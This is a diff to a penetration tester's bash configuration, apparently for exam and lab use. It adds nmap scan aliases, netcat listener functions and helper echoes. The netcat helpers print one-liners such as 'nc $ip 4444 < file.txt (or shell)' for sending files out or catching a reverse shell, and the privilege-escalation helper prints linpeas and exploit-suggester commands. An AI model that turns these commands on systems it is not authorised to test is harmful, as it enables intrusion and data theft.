@@ -262,8 +262,15 @@ fi
 ######### ALIAS FOR PENTESTING #############
 ############################################
 
+###########################################################
+# Run VPN for exam and labs 
+###########################################################
+
+alias run='sudo openvpn' # sudo run openvpn
+
 # Fast clean.
 alias c='clear'
+
 ###########################################################
 # Get Repo
 ###########################################################
@@ -276,10 +283,10 @@ alias nmaptcp='sudo nmap -n -Pn -d -sS --open -p- -T4 --min-rate=10000'
 alias nmapudp='sudo nmap -n -Pn -d -sU --open -p- -T4 --min-rate=10000'
 # nmap scans versioning 
 alias nmaptcpversion='sudo nmap -d -sCSV -T4 --min-rate=10000 -p'
-alias nmapudoversion='sudo nmap -d -sCUV -T4 --min-rate=10000 -p'
+alias nmapudpversion='sudo nmap -d -sCUV -T4 --min-rate=10000 -p'
 
 ###########################################################
-# Print useful command 
+# Print useful commands 
 ###########################################################
 
 # === Add to ~/.bashrc ===
@@ -352,6 +359,7 @@ helplinux() {
   echo -e "${RED}Run: /tmp/linpeas.sh | tee linpeas.out${NC}"
   echo -e "${RED}Run: /tmp/linpeas.sh -P \'Password123!\' | tee linpeas_pw.out${NC}"
   echo -e "${RED}Run: /tmp/LinEnum.sh${NC}"
+  echo -e "${RED}Run: /tmp/linux-exploit-suggester.sh${NC}"
   echo -e "${RED}Run: /tmp/linux-exploit-suggester.sh${NC}"
   echo ""
   echo -e "${BOLD}${PURPLE}════════════════════════════════════════════════════${NC}"
@@ -454,7 +462,7 @@ n4444() {
   infostart
   ip=$(get_device_ip)
   [ -z "$ip" ] && { echo "No network IP"; cd - > /dev/null; return 1; }
-  echo "Netcat listener on $ip:4444... nc $ip 443 < file.txt (or shell)"
+  echo "Netcat listener on $ip:4444... nc $ip 4444 < file.txt (or shell)"
   rlwrap nc -lvvnp 4444
   cd - > /dev/null
 }
@@ -464,7 +472,7 @@ n5555() {
   infostart
   ip=$(get_device_ip)
   [ -z "$ip" ] && { echo "No network IP"; cd - > /dev/null; return 1; }
-  echo "Netcat listener on $ip:5555... nc $ip 443 < file.txt (or shell)"
+  echo "Netcat listener on $ip:5555... nc $ip 5555 < file.txt (or shell)"
   rlwrap nc -lvvnp 5555
   cd - > /dev/null
 }
@@ -494,7 +502,7 @@ n80() {
   infostart
   ip=$(get_device_ip)
   [ -z "$ip" ] && { echo "No network IP"; cd - > /dev/null; return 1; }
-  echo "Netcat listener on $ip:80... nc $ip 443 < file.txt (or shell)"
+  echo "Netcat listener on $ip:80... nc $ip 80 < file.txt (or shell)"
   rlwrap nc -lvvnp 80
   cd - > /dev/null
 }
